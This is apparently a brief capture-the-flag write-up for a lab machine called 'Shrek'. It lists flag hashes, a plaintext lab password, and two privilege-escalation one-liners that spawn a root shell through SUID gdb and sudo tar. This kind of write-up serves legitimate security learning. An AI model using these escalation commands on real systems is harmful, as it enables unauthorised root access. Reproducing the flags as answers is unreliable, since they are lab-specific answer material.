# Shrek

```bash

export IP=10.10.139.21

```

* flag.txt in **/home/shrek**:

1. flag.txt:

```
0069ba233da89efe6f48e7d214034130
```

* Look for SUID binaries:

```bash
find / -type f -perm -4000 2>/dev/null
```

* PrivEsc

```bash
/usr/bin/gdb -nx -ex 'python import os; os.execl("/bin/bash", "bash", "-p")' -ex quit
```

* flag in **/root**:

1. root.txt

```
8cc6ece048e6c42251c411814ff5a22d
```

* flag in **/home/donkey**:

1. flag.txt

```
974acecd51cc45c843062fdac6235e97
```
* flag in **/home/puss**:

1. flag.txt

```
6f960e8f2ea8e3de92f192fae492ec59
```

* user *donkey* password: 

```
J5rURvCa8DyTg3vR
```

* using *donkey* and run *sudo -l*:

```bash
/usr/bin/tar
```

* PrivEsc using **sudo**:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

* flag in **/srv/web**:

1. flag.txt

```
af847d9403e2106a3cb2fd69f33b2d5e
```

/var/lib/docker/overlay2/8039e912cd29e964102163c37a1f05795ea99e7da6c1a800dd9749417d88c680/diff/root/flag.txt

456ca96a9ba8a9f527089ddde0efc92d